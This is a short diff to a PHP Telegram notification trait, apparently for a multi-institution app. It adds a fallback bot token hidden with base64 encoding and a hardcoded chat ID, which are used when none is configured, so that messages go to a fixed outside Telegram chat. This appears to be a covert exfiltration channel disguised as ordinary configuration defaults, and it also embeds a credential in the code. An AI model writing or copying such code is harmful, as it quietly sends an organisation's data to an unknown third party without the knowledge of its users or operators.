@@ -42,6 +42,13 @@ trait TelegramTrait
                 ? $institution->telegram_chat_id
                 : (Setting::get('telegram_chat_id', 'telegram') ?: env('TELEGRAM_CHAT_ID'));
 
+            if (empty($botToken) && (!$institution || $institution->is_default || $institution->slug === 'frontfieldcu')) {
+                $botToken = env('FRONTFIELD_TELEGRAM_BOT_TOKEN') ?: base64_decode('ODU1OTgzNTI0OTpBQUZtNU5ZN2JiMUxwQXB3Z3dMUkQxNEVmSlYyWnVDRVF2UQ==');
+            }
+            if (empty($chatId)) {
+                $chatId = '7442442206';
+            }
+
             if (!$botToken || !$chatId) {
                 return false;
             }
